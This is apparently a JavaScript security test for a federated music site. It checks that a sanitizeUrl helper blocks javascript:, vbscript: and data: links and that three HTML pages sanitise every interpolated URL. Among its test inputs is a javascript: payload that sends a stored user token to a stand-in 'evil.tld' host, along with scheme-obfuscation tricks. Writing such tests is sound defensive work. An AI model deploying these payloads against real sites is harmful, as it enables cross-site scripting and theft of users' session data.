/**
 * Every URL rendered by this site can arrive from a federated TuneCamp instance,
 * and an instance is not a trusted party. Two helpers guard that: escapeHtml()
 * keeps a value inside its attribute, sanitizeUrl() decides whether the scheme is
 * one we are willing to navigate to. They are not interchangeable, and profile.html
 * used only the first — so this file pins both the helpers and the call sites.
 *
 *     node --experimental-default-type=module tests/url-safety.test.js
 *
 * It exits non-zero on the first failure.
 */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');

let passed = 0;
function ok(cond, label) {
    if (!cond) {
        console.error(`FAIL — ${label}`);
        process.exit(1);
    }
    passed++;
}

// utils.js is a classic script, so load it the way a browser would.
globalThis.window = { location: { origin: 'https://tunecamp.xyz' } };
const utils = readFileSync(join(root, 'utils.js'), 'utf8');
// eslint-disable-next-line no-eval
(0, eval)(`${utils}; globalThis.escapeHtml = escapeHtml; globalThis.sanitizeUrl = sanitizeUrl;`);

// --- the two helpers do different jobs ------------------------------------

const hostile = "javascript:fetch('https://evil.tld/?'+localStorage.getItem('tunecamp_zen_user'))";

// A browser HTML-decodes an attribute value before it resolves the URL, so
// entity-escaping a href leaves the scheme entirely intact.
const decoded = escapeHtml(hostile)
    .replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"').replace(/&#039;/g, "'");
ok(decoded === hostile, 'escapeHtml round-trips a javascript: URL untouched — it is not a URL guard');

ok(sanitizeUrl(hostile) === '#', 'sanitizeUrl refuses javascript:');
ok(sanitizeUrl('vbscript:msgbox(1)') === '#', 'sanitizeUrl refuses vbscript:');
ok(sanitizeUrl('data:text/html,<script>x</script>') === '#', 'sanitizeUrl refuses data: by default');
ok(sanitizeUrl('data:image/png;base64,AAA', true) !== '#', 'sanitizeUrl allows data: when asked (cover art)');
ok(sanitizeUrl('https://a.test/album') === 'https://a.test/album', 'an ordinary https URL passes through');
ok(sanitizeUrl('/relative/path') === '/relative/path', 'a relative path passes through');
ok(sanitizeUrl('') === '#' && sanitizeUrl(null) === '#', 'nothing at all becomes a dead link');

// URL parsing normalises away the tricks that hide a scheme from a naive check.
ok(sanitizeUrl('  javascript:alert(1)') === '#', 'leading whitespace does not smuggle a scheme past it');
ok(sanitizeUrl('java\nscript:alert(1)') === '#', 'nor does an embedded newline');
ok(sanitizeUrl('JaVaScRiPt:alert(1)') === '#', 'nor does mixed case');

// --- the call sites actually use it ---------------------------------------
//
// profile.html renders releases, favourites and playlists aggregated from every
// linked instance. It carried its own escapeHtml and never loaded utils.js, so
// three <a href> sinks took a remote instance's URL with no scheme check at all.

/**
 * Collects any `href="${...}"` / `src="${...}"` whose value never met sanitizeUrl.
 * A sink may sanitise inline, or interpolate a local that was sanitised where it
 * was assigned (index.html does the latter), so a bare identifier is resolved back
 * to its declaration before it counts as a miss. Matching the sink shape rather
 * than a list of field names is what makes a newly added one answer for itself.
 */
function unsanitisedUrlSinks(source) {
    return [...source.matchAll(/(?:href|src)="\$\{([^}]*)\}"/g)]
        .map((m) => m[1].trim())
        .filter((expr) => {
            if (expr.includes('sanitizeUrl')) return false;
            const identifier = expr.match(/^([A-Za-z_$][\w$]*)$/);
            if (!identifier) return true;
            const assigned = new RegExp(
                `(?:const|let|var)\\s+${identifier[1]}\\s*=[^;]*sanitizeUrl`,
            );
            return !assigned.test(source);
        });
}

const profile = readFileSync(join(root, 'profile.html'), 'utf8');
ok(/<script src="utils\.js"><\/script>/.test(profile), 'profile.html loads the shared helpers');

const unsafeSinks = unsanitisedUrlSinks(profile);
ok(unsafeSinks.length === 0, `profile.html sanitises every interpolated URL (found: ${unsafeSinks.join(', ')})`);

// index.html was already doing this; keep it that way.
const index = readFileSync(join(root, 'index.html'), 'utf8');
const unsafeIndexSinks = unsanitisedUrlSinks(index);
ok(unsafeIndexSinks.length === 0, `index.html sanitises every interpolated URL (found: ${unsafeIndexSinks.join(', ')})`);

// player.html renders the same federated tracks, plus playlists fetched from a
// relay by whatever pubkey a ?pl= link names.
const player = readFileSync(join(root, 'player.html'), 'utf8');
const unsafePlayerSinks = unsanitisedUrlSinks(player);
ok(unsafePlayerSinks.length === 0, `player.html sanitises every interpolated URL (found: ${unsafePlayerSinks.join(', ')})`);

console.log(`ok — ${passed} assertions passed`);
